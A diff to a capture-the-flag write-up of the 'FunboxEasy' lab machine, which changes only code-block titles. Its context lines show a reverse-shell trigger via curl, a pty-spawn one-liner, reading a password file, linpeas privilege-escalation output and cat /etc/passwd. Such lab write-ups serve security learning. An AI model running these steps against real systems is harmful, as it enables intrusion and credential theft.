@@ -61,7 +61,7 @@ http://funboxeasy/store/admin_edit.php?bookisbn=978-1-49192-706-9 -> Changing th
 
 After uploading the book, start a listener and go to http://funboxeasy/store/index.php to catch the shell.
 
-```shell title:"reverse shell"
+```shell
 $ cat /home/tony/password.txt
 ssh: yxcvbnmYYY
 gym/admin: asdfghjklXXX
@@ -73,7 +73,7 @@ gym/admin: asdfghjklXXX
 SSH using tony's credentials
 ## Privilege Escalaltion
 
-```shell title:"linpeas.sh"
+```shell
 ══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                       ╚════════════════════════════════════╝
 ╔══════════╣ SUID - Check easy privesc, exploits and write perms
@@ -262,7 +262,7 @@ After editing, we can upload it to `mini.php`. It should reflect after uploading
 
 Starting a listener, we access the resource.
 
-```shell title:"Accessing the resource"
+```shell
 curl http://funboxeasyenum/php-reverse-shell.php
 ```
 
@@ -282,12 +282,12 @@ $
 
 ## Privilege Escalation
 
-```shell title:"Spawn tty shell"
+```shell
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@funbox7:/$ 
 ```
 
-```shell title:"linpeas.sh output"
+```shell
 <...>
 ╔══════════╣ Readable files belonging to root and readable by me but not world readable
 -rw-r----- 1 root www-data 525 Sep 18  2020 /etc/phpmyadmin/config-db.php
@@ -297,7 +297,7 @@ www-data@funbox7:/$
 <...>
 ```
 
-```shell title:"/etc/passwd"
+```shell
 www-data@funbox7:/$ cat /etc/passwd
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
